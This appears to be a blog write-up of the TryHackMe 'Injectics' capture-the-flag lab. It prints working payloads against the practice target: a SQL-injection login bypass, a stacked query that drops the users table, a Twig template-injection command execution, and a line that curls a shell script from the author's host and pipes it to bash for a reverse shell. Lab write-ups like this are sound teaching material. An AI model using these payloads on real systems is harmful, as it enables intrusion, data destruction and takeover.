---
layout: post
title:  "Injectics (THM)"
date:   2025-08-28 21:10:20 -0400
author: robo.uzi
tags: [TryHackMe, ctf]
---
{% raw %}
## Initial Access

`nmap -p- -T5 -vv 10.10.61.166 -oN injecticsfullnmap.txt`

`nmap -sVC -p 22,80 -vv -T4 10.10.61.166 -oN injecticsnmap.txt`: 
```shell
PORT   STATE SERVICE REASON  VERSION  
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)  
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))  
| http-cookie-flags:    
|   /:    
|     PHPSESSID:    
|_      httponly flag not set  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-title: Injectics Leaderboard  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```shell
ffuf -u http://10.10.61.166/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e .txt .php -t 60
flags         [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 216ms]  
css           [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 221ms]  
js            [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 223ms]  
javascript    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 221ms]  
vendor        [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 224ms]
```
There is also `/login.php`, `/functions.php`, and `/adminLogin007.php`. 

In the source there is the comment: `<!-- Website developed by John Tim - dev@injectics.thm-->`.

I also see the comment: `<!-- Mails are stored in mail.log file-->`.

Add `injectics.thm` to `/etc/hosts`.

Visiting `http://injectics.thm/mail.log` I get a note:
```html
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.
```
It hints at the table `users` and the "Injectics service". It also contained these credentials:
```html
Here are the default credentials that will be added:
| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |
```

These creds dont seem to work. It says the Injectics service will insert these into the database every minute. Maybe I need to delete an entry from the database somehow to trigger it. 

On `/functions.php` I can send these parameters: 
```t
username=dev%40injectics.thm&password=password&function=login
```
In response: `{"status":"error","message":"Invalid email or password"}`.

On `/adminLogin007.php` I can send these paramters: 
```t
mail=dev%40injectics.thm&pass=password
```
In response: `Invalid email or password.`

I spot this in the js for the `/login.php` also:
```javascript
const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
            for (let keyword of invalidKeywords) {
                if (username.includes(keyword)) {
                    alert('Invalid keywords detected');
                   return false;
```
This is client side js that is bypassed easily using burpsuite or similar.

After some testing I find this: `username=a' || 1=1-- -&password=password&function=login`. This payload bypassed authentication. I proxy the request, login as dev, and land at `http://injectics.thm/dashboard.php`.

Now I can edit the scoreboard on the site. At `http://injectics.thm/edit_leaderboard.php?rank=1&country=USA` I test more payloads for how I change the database somehow. This should populate it with admin creds I can use. 

I capture the request for updating the leaderboard. Eventually I trigger a table to be dropped with:
`rank=1&country=&gold=23; drop table users -- -&silver=22&bronze=12345`. After I refresh it says:
```html
Seems like database or some important table is deleted. InjecticsService is running to restore it. Please wait for 1-2 minutes.
```

Now I can login with `superadmin@injectics.thm:superSecurePasswd101`. As admin on the dashboard I get the first flag.

Now I have access to the `Profile` tab where I can update the email, first name, and last name. When I visit the dashboard I see `Welcome admin`. Seems like my first name is reflected on the page. I change the first name to confirm it. 

I test for SSTI. Usually the basic payload is `{{7*7}}` or similar. I enter `{{7*7}}` as the first name, update it, and return to the dashboard. I see: `Welcome, 49!`. It works!

I go to [https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) to search for payloads. Through testing I think it is `Twig (PHP)` SSTI. For example `{{7*'7'}}` would result in `49` in Twig, and `7777777` in Jinja2. I test it and get `49`.

I enter `{{['id']|filter('system')}}` and get the error: 
```html
The callable passed to "filter" filter must be a Closure in sandbox mode in "__string_template__8a0a34f3ef7bb4027995c4af464e338fdb11b6a04e25524a117eb8284867d004" at line 1.
```
I get errors from almost everything I try. Now Im reffering to [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md#twig---code-execution](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md#twig---code-execution).

When I run `{{['id']|sort('passthru')}}` I see `Welcome, Array!`. This is doing something. There is no error. Running `{{['id',""]|sort('passthru')}}` with the extra argument causes the `id` command results to be reflected. This is because execution only happens when `sort` actually invokes the callback, which requires at least two arguments. 

I go to revshells.com and get a python reverse shell. I save to a file, host it on a server, curl it, and pipe it to bash. I set my listener (`nc -lvnp 4444`) and use this payload: `{{['curl http://10.13.66.123:8000/shell|bash',""]|sort('passthru')}}`.

I catch the shell and run `cat /var/www/html/flags/5d8a-redacted-9f48.txt` to get the final flag. The end!!
{% endraw %}
___
